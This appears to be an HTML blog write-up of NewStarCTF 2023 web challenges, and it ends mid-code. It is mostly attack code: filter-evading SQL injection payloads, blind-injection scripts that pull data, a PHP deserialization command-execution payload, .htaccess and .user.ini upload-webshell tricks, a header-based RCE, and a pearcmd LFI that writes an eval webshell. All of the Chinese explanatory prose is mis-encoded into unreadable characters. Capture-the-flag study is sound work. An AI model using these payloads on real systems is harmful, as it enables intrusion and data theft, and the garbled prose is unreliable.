<h3 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h3><p><code>unionæ³¨å…¥</code><br><code>select</code>å’Œ<code>or</code>è¿‡æ»¤ï¼Œæ¢å¤§å†™(æˆ–è€…å¤§å°å†™)ç»•è¿‡ï¼Œ<code>#</code>ç”¨ä¸äº†ï¼Œè¦æ¢<code>%23</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">çˆ†å­—æ®µæ•°</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union SELECT 1,2,3,4,5%23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">çˆ†æ•°æ®åº“å(å¾—åˆ° ctf)</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">SELECT</span> <span class="number">1</span>,database(),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span><span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br><span class="line">(ä¸‹é¢ç”¨çš„æ˜¯æˆ‘æŸä¸ªæ¯”èµ›çš„payload)</span><br><span class="line"></span><br><span class="line">çˆ†è¡¨åï¼Œå‘ç°<span class="keyword">or</span>ä¹Ÿè¢«è¿‡æ»¤äº†(å¾—åˆ°here_is_flag)</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;/**/Union/**/Select/**/1,Group_concat(Table_name),3,4,5/**/From/**/InfoRmation_schema.tables/**/Where/**/Table_schema=database()%23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">çˆ†å­—æ®µå(å¾—åˆ°flag)</span></span><br><span class="line"><span class="string">1&#x27;</span><span class="comment">/**/</span><span class="keyword">Union</span><span class="comment">/**/</span><span class="keyword">Select</span><span class="comment">/**/</span><span class="number">1</span>,Group_concat(Column_name),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span><span class="comment">/**/</span><span class="keyword">From</span><span class="comment">/**/</span>InfOrmation_schema.columns<span class="comment">/**/</span><span class="keyword">Where</span><span class="comment">/**/</span>Table_name<span class="operator">=</span><span class="string">&#x27;here_is_flag&#x27;</span><span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br><span class="line">è·å–å­—æ®µå†…å®¹</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;/**/Union/**/Select/**/1,Group_concat(flag),3,4,5/**/From/**/here_is_flag%23</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<h3 id="Unserializeï¼Ÿ"><a href="#Unserializeï¼Ÿ" class="headerlink" title="Unserializeï¼Ÿ"></a>Unserializeï¼Ÿ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Maybe you need learn some knowledge about deserialize?</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">            @<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="comment">// $a-&gt;cmd = &#x27;ls /&#x27;;</span></span><br><span class="line"><span class="variable">$a</span>-&gt;cmd = <span class="string">&#x27;ca\t /th1s_1s_fffflllll4444aaaggggg&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<h3 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h3><p>è¿™ä¸€æ¬¡æ˜¯æœ‰åç«¯æ£€æµ‹æœºåˆ¶äº†ï¼Œä¸Šä¼ jpgæ–‡ä»¶ä¹Ÿä¸è¡Œï¼Œè¯´æ˜æ£€æµ‹åˆ°äº†æ–‡ä»¶å†…å®¹çš„<code>&lt;?</code>ï¼Œæˆ‘ä»¬æ›¿æ¢ä¸ºjsé©¬ï¼Œ<code>&lt;script language=&#39;php&#39;&gt;system(&#39;ls&#39;);&lt;/script&gt;</code><br>èƒ½ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œä½†è§£æä¸æˆphpæ–‡ä»¶ï¼Œè¿™æ—¶åˆ©ç”¨<code>.htaccess</code>è§£æ</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;<span class="title class_">FilesMatch</span> <span class="string">&quot;test&quot;</span>&gt;</span><br><span class="line">  <span class="title class_">SetHandler</span> application/x-httpd-php</span><br><span class="line">&lt;/<span class="title class_">FilesMatch</span>&gt;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸€ç§é‡‡ç”¨æ­£åˆ™åŒ¹é…ï¼Œåªè¦æ–‡ä»¶åä¸ºtestçš„æ–‡ä»¶éƒ½å°†è¢«ä½œä¸ºphpæ–‡ä»¶è§£æ</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">AddType</span> application/x-httpd-php .<span class="property">jpg</span></span><br></pre></td></tr></table></figure>
<p>ç¬¬äºŒç§æ˜¯å°†.jpgæ–‡ä»¶éƒ½ä½œä¸ºphpæ–‡ä»¶è§£æ</p>
<p>æ‰€ä»¥ï¼Œæˆ‘ä»¬å…ˆä¸Šä¼ <code>.htaccess</code>æ–‡ä»¶ï¼Œå†ä¸Šä¼ å›¾ç‰‡é©¬</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6047?time__1311=n4%2BxnD0DRDgGG%3DNDtG8Dlhje0%3D5I%2BbrOwhGrD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-10">https://xz.aliyun.com/t/6047?time__1311=n4%2BxnD0DRDgGG%3DNDtG8Dlhje0%3D5I%2BbrOwhGrD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-10</a><br>è¯´èµ·è¿™ä¸ªï¼Œæˆ‘ä»¬è¿˜æœ‰<code>.user.iniæ–‡ä»¶æ„æˆPHPåé—¨</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=a.<span class="property">jpg</span></span><br></pre></td></tr></table></figure>
<p>å†ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œå¥½åƒapachaæ¨¡å¼ä¸‹æ˜¯ä¸å¯è¡Œçš„ï¼Œä¸Šé¢çš„ä¸¤ä¸ªæ–¹æ³•å¯ç”¨</p>
<h3 id="R-C-E-1"><a href="#R-C-E-1" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h3><p><code>gitæ³„éœ²</code>ï¼Œ<code>Githack</code>æˆ–è€…<code>git_extract</code>ä¸¤ä¸ªå¥½åƒéƒ½æ˜¯Python2çš„ç¯å¢ƒ<br>åˆ‡æ¢Python2ç¯å¢ƒ(rootæƒé™)ï¼Œ<code>python GitHack.py url/.git/</code>ï¼Œä¸‰ä¸ªæ–‡ä»¶ï¼Œåªæœ‰è¿™ä¸ªæœ‰ç”¨</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// bo0g1pop.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>æ— å‚RCE</code>ï¼Œå¾ˆå¤šå‡½æ•°è¿˜ç”¨ä¸äº†</p>
<p>å‚è€ƒ<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_53146913/article/details/124133822">https://blog.csdn.net/weixin_53146913/article/details/124133822</a></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">/bo0g1pop.php?star=</span><br><span class="line">print_r(getallheaders());  æŸ¥çœ‹è¯·æ±‚å¤´</span><br><span class="line">eval(next(getallheaders()));  æŠŠå‘½ä»¤æ‰§è¡Œæ”¾åœ¨UAå¤´</span><br><span class="line">User Agent: system(&quot;cat /f*&quot;);</span><br></pre></td></tr></table></figure>
<h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="Include-ğŸ"><a href="#Include-ğŸ" class="headerlink" title="Include ğŸ"></a>Include ğŸ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        <span class="comment"># Something in phpinfo.php!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>é¢˜ç›®çš„æ¢¨<code>pear</code></p>
<p><code>phpinfo.php</code>å‘ç°<code>register_argc_argv</code>å¼€å¯ï¼Œå¯ä»¥<code>åˆ©ç”¨pearcmd.phpå®ç°LFI</code>ï¼Œä¹Ÿèƒ½æœåˆ°ä¸å°‘å‚è€ƒæ–‡ç« <br><a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/122050370">https://blog.csdn.net/RABCDXB/article/details/122050370</a></p>
<p>å®˜æ–¹ç»™çš„å‚è€ƒ<br><a target="_blank" rel="noopener" href="https://tttang.com/archive/1312/">https://tttang.com/archive/1312/</a></p>
<p>åœ¨pearcmd.phpä¸­&amp;ç¬¦æ— å‘åˆ†å‰²å‚æ•°ï¼ŒçœŸæ­£èƒ½åˆ†å‰²å‚æ•°çš„æ˜¯+ï¼›ç„¶åå°±æ˜¯åˆ©ç”¨çš„å‘½ä»¤ä¸ºconfig-createï¼Œå…¶åŒ…æ‹¬ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯ç»å¯¹è·¯å¾„ï¼Œè¿˜æœ‰ä¿å­˜é…ç½®æ–‡ä»¶çš„æ–‡ä»¶åï¼›å¹¶ä¸”ç¬¬ä¸€ä¸ªå‚æ•°ä¼šè¢«å†™è¿›åˆ°æ–‡ä»¶é‡Œï¼Œæˆ‘ä»¬å€Ÿæ­¤å®ç°å‘½ä»¤æ‰§è¡Œ<br><code>/?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[0]);?&gt;+/tmp/cmd.php</code><br>å†<br><code>/?file=tmp/cmd</code>ï¼Œä¹Ÿå¯ä»¥ç›´æ¥è®¿é—®<br><code>POST: 0=system(&#39;cat /flag&#39;);</code>ï¼Œå¥½åƒç¯å¢ƒæœ‰é—®é¢˜ï¼Œflagè¯»ä¸å‡ºæ¥ï¼Ÿ</p>
<p>è¦æ³¨æ„phpç‰ˆæœ¬ä¸åŒï¼Œpearcmd.phpçš„ä½ç½®ä¸ç›¸åŒï¼Œæœ‰çš„æ˜¯åœ¨<code>/usr/share/pear/pearcmd.php</code>ï¼Œä¸€èˆ¬éƒ½æ˜¯åœ¨<code>/usr/local/lib/php/pearcmd.php</code></p>
<p>åŒæ—¶å­¦ä¹ è¿‡ç¨‹ä¸­è¿˜æ³¨æ„åˆ°ï¼Œé…ç½®ä¸­é»˜è®¤æ²¡å¼€å¯<code>register_argc_argv</code>é€‰é¡¹ï¼Œä½†æˆ‘ä»¬å¯ä»¥å…ˆä¸Šä¼ <code>.htaccess(Apache)</code>æˆ–<code>.user.ini</code>æ¥å¯¹é…ç½®è¿›è¡Œè¦†ç›–</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">.htaccess</span><br><span class="line">php_value register_argc_argv On</span><br><span class="line"></span><br><span class="line">.user.ini</span><br><span class="line">register_argc_argv=On</span><br></pre></td></tr></table></figure>
<h3 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h3><p><code>sqlæ³¨å…¥è¿˜æ˜¯æŒºè–„å¼±çš„QWQ</code><br>ä¸‹é¢è·Ÿç€å­¦ä¹ <br><a target="_blank" rel="noopener" href="https://c1oudfl0w0.github.io/blog/2023/10/15/NewStarCTF-2023-Week3/#medium-sql-%E5%A4%8D%E7%8E%B0">https://c1oudfl0w0.github.io/blog/2023/10/15/NewStarCTF-2023-Week3/#medium-sql-%E5%A4%8D%E7%8E%B0</a></p>
<p>æµ‹è¯•å­˜åœ¨å¸ƒå°”ç›²æ³¨</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span>TMP0919<span class="string">&#x27;And if(1&gt;0,1,0)%23</span></span><br><span class="line"><span class="string">?id=TMP0919&#x27;</span><span class="keyword">And</span> if(<span class="number">0</span><span class="operator">&gt;</span><span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>)<span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>
<p>å‰è€…å¯ä»¥è¿”å›æ­£å¸¸çš„ä¿¡æ¯<code>id: TMP0919</code>ï¼Œåè€…ä¼šè¿”å›<code>id not exists</code>ï¼Œè¯´æ˜é¡µé¢å¯ä»¥æ ¹æ®ifåˆ¤æ–­çš„ç»“æœå›æ˜¾ä¸¤ç§ï¼ˆçœŸå‡ï¼‰å†…å®¹ï¼Œ<br>å› æ­¤æ˜¯å¸ƒå°”ç›²æ³¨<br>ç”¨å¤§å°å†™ç»•è¿‡è¢«è¿‡æ»¤çš„å­—ç¬¦</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/qiushuo/p/17485659.html#medium-level">https://www.cnblogs.com/qiushuo/p/17485659.html#medium-level</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://d9946033-bc9c-4965-bb87-36c2b370c234.node5.buuoj.cn:81/&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    head = <span class="number">1</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload = f&quot;TMP0919&#x27; And if(asCii(Substr((Select Group_Concat(table_name) fRom infoRmation_schema.tables wHere tAble_schema=dAtabase()),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&quot;</span></span><br><span class="line">        <span class="comment"># grades,here_is_flag</span></span><br><span class="line">        <span class="comment"># payload=f&quot;TMP0919&#x27; And if(asCii(Substr((Select Group_Concat(column_name) fRom infoRmation_schema.columns wHere tAble_name=&#x27;here_is_flag&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&quot;</span></span><br><span class="line">        <span class="comment"># flag</span></span><br><span class="line">        payload = <span class="string">f&quot;TMP0919&#x27; And if(asCii(Substr((Select flag fRom here_is_flag),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)%23&quot;</span></span><br><span class="line">        <span class="comment"># æŸ¥flagå­—æ®µ</span></span><br><span class="line">        param = <span class="string">&quot;id=&quot;</span> + payload</span><br><span class="line">        <span class="comment"># data = &#123;&quot;id&quot;: payload&#125;</span></span><br><span class="line">        r = requests.get(url, params=param)</span><br><span class="line">        <span class="comment"># r = requests.post(url, data=data)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;id: TMP0919&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">1</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>ä¸æ˜¯å¾ˆç¨³å®šï¼Œå¤šè·‘å‡ æ¬¡ï¼Œä¸ä¸€å®šå®Œæ•´ï¼Œä½†èƒ½å‡‘<br>æˆ‘çªç„¶æƒ³èµ·äº†ä¹‹å‰åšctfshowä¹Ÿæœ‰ç±»ä¼¼çš„é¢˜ç›®ï¼Œè„šæœ¬æ˜¯è¿™æ ·çš„</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://ff8a57df-2b62-4390-99cb-98273737c05f.challenge.ctf.show/?id=&#x27;/**/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr(database(),%d,1))&gt;%d,1,0)&#x27; % (i, mid)</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema=database())),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_name=&quot;flag&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;</span></span><br><span class="line">        payload = <span class="string">f&#x27;if(ascii(substr((select/**/(flag)from(flag)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)&#x27;</span></span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;By Rudyard Kipling&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
<p>æˆ‘æ˜¯æ‡’ç‹—ï¼Œå…¶å®å¯ä»¥è‡ªå·±æ”¹è¿™ä¸ªäºŒåˆ†è„šæœ¬æ‰“ï¼Œä½†æ˜¯æ‘†äº†æ‘†äº†<br>å†çœ‹çœ‹å®˜æ–¹</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">condition</span>(<span class="params">res</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Physics&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">_url = <span class="string">&#x27;http://d9946033-bc9c-4965-bb87-36c2b370c234.node5.buuoj.cn:81/&#x27;</span></span><br><span class="line"><span class="keyword">for</span> _time <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;time:%d&quot;</span> % (_time))</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> (right &gt; left):</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">        <span class="comment"># è·å–å½“å‰åº“è¡¨å</span></span><br><span class="line">        <span class="comment"># url = f&quot;&#123;_url&#125;?id=TMP0919&#x27; And if((((Ord(sUbstr((Select(grouP_cOncat(table_name))fRom(infOrmation_schema.tables)whEre((tAble_schema) In (dAtabase()))) fRom &#123;_time&#125; FOr 1))))In(&#123;mid&#125;)),1,0)%23&quot;</span></span><br><span class="line">        url = <span class="string">f&quot;<span class="subst">&#123;_url&#125;</span>?id=TMP0919&#x27; And if((((Ord(sUbstr((Select(flag)fRom(here_is_flag)) fRom <span class="subst">&#123;_time&#125;</span> FOr 1))))In(<span class="subst">&#123;mid&#125;</span>)),1,0)%23&quot;</span></span><br><span class="line">        <span class="comment"># è·å–å­—æ®µå</span></span><br><span class="line">        <span class="comment"># url = f&quot;&#123;_url&#125;?id=TMP0919&#x27; And if((((Ord(sUbstr((Select(grouP_cOncat(column_name))fRom(infOrmation_schema.columns)whEre((tAble_name) In (&#x27;here_is_flag&#x27;))) fRom &#123;_time&#125; FOr 1))))In(&#123;mid&#125;)),1,0)%23&quot;</span></span><br><span class="line">        <span class="comment"># è·å–å­—æ®µå€¼</span></span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        res = requests.get(url=url)</span><br><span class="line">        <span class="keyword">if</span> (condition(res)):</span><br><span class="line">            result += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># è·å–å½“å‰åº“è¡¨å</span></span><br><span class="line">            <span class="comment"># url = f&quot;&#123;_url&#125;?id=TMP0919&#x27; And if((((Ord(sUbstr((Select(grouP_cOncat(table_name))fRom(infOrmation_schema.tables)whEre((tAble_schema) In (dAtabase()))) fRom &#123;_time&#125; FOr 1))))&gt;(&#123;mid&#125;)),1,0)%23&quot;</span></span><br><span class="line">            <span class="comment"># è·å–å­—æ®µå</span></span><br><span class="line">            <span class="comment"># url = f&quot;&#123;_url&#125;?id=TMP0919&#x27; And if((((Ord(sUbstr((Select(grouP_cOncat(column_name))fRom(infOrmation_schema.columns)whEre((tAble_name) In (&#x27;here_is_flag&#x27;))) fRom &#123;_time&#125; FOr 1))))&gt;(&#123;mid&#125;)),1,0)%23&quot;</span></span><br><span class="line">            <span class="comment"># è·å–å­—æ®µå€¼</span></span><br><span class="line">            url = <span class="string">f&quot;<span class="subst">&#123;_url&#125;</span>?id=TMP0919&#x27; And if((((Ord(sUbstr((Select(flag)fRom(here_is_flag)) fRom <span class="subst">&#123;_time&#125;</span> FOr 1))))&gt;(<span class="subst">&#123;mid&#125;</span>)),1,0)%23&quot;</span></span><br><span class="line">            res = requests.get(url=url)</span><br><span class="line">            <span class="keyword">if</span> (condition(res)):</span><br><span class="line">                left = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br></pre></td></tr></table></figure>
<p>å‘œå‘¼å‘¼ï¼Œä¼šå¥—è„šæœ¬ç»ˆç©¶æ˜¯ä¸€æ—¶çš„ï¼ŒçœŸçš„æ‡‚åŸç†ï¼Œä¼šè½¬åŒ–ä¸ºè„šæœ¬æ‰æ˜¯åšçš„(ç²¤è¯­è¯»æ³•)QWQ</p>
<h3 id="POP-Gadget"><a href="#POP-Gadget" class="headerlink" title="POP Gadget"></a>POP Gadget</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$vars</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">getStr</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span 